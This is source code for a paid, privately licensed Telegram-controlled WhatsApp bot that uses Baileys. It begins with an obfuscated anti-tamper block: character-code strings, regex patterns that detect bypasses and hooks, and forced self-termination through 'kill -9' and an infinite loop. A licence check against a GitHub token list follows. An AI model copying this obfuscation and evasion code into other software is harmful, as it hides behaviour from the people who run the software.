 (function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const https = require("https");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_BOT } = require("./config");
const BOT_TOKEN = TOKEN_BOT;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function memory() {
  return (process.memoryUsage().rss / 1024 / 1024).toFixed(0) + " MB";
}
// ================= SECURITY =================//

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/GyzkxT/Gyzk11/refs/heads/main/token.json";////ganti jadi Raw luh



async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

if (!validTokens.length) {
  console.log(`
   ⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀
 ❌ ── ACCESS DENIED ── ❌
   × Token tidak terdaftar
   × Aktivitas mencurigakan terdeteksi
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀
   • Creator : @VorteyG & @Gyzkx
   • Script  : Akaozik Imvictus
   • System  : Auto Update
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
`);
  process.exit(1);
}

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(""));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token valid"));
  startBot();
}

function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀

─────────────────────
DEVELOPER : @Gyzkx & @VorteyG
VERSION : 1.0 
SYSTEM : MONGODB 
STATUS : ACTIVE/TERHUBUNG
─────────────────────`))
}

validateToken()

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(`
   ⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀
   ─ SYSTEM READY & CONNECTED ─
   
   ✓ Secure Connection Established
   ✓ Protection Layer Activated
   ✓ Premium Encryption Running

⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀
   • Creator : @VorteyG & @Gyzkx
   • Script  : Akaozik Imvictus
   • System  : Auto Update
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
    AKAOZIK • PRIVATE SYSTEM
`);

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀

─────────────────────
   Creator : @VorteyG & @Gyzkx
   Script  : 𝙰𝚔𝚊𝚘𝚣𝚒𝚔 𝙸𝚖𝚟𝚒𝚌𝚝𝚞𝚜
   System  : Buy Only
   Status  : Connected ✓
   WhatsApp: ${linkedWhatsAppNumber}
─────────────────────   
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`
<blockquote>⬡═―—⊱ ⎧ SUCCESS PAIRING ✅ ⎭ ⊰―—═⬡
⌑ To Number : ${lastPairingMessage.phoneNumber}
⌑ Status : Sudah terhubung √
╘═——————————————═⬡</blockquote>
`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ ☇ Sender tidak terhubung, silahkan ketik /connect 62xx untuk menghubungkan kembali koneksi Whatsapp ke dalam perangkat");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
